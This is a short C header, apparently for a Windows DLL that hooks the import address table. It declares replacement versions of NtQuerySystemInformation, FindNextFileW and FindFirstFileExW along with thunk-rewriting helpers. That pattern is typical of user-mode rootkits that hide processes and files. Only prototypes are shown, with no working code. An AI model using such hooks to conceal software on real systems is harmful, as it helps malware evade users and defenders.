#ifndef _IATHOOKER_H_
#define _IATHOOKER_H_



NTSTATUS WINAPI HookedNtQuerySystemInformation(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength);

int WINAPI newFindNextFileW(__in HANDLE hFindFile, __out LPWIN32_FIND_DATAW lpFindFileData);


// FindFirstFileExW (Unicode)
HANDLE WINAPI newFindFirstFileExW(__in LPCWSTR lpFileName, __in FINDEX_INFO_LEVELS fInfoLevelId, __out LPVOID lpFindFileData, __in FINDEX_SEARCH_OPS fSearchOp, __reserved  LPVOID lpSearchFilter, __in DWORD dwAdditionalFlags);

bool rewriteThunk(PIMAGE_THUNK_DATA pThunk, DWORD64 newFunc, DWORD oldFunc);
bool IAThooking(DWORD64 hProcess, LPCSTR targetFunction, DWORD64 newFunc, DWORD orgFunc);
void main();
BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved);

#endif /* _IATHOOKER_H_ */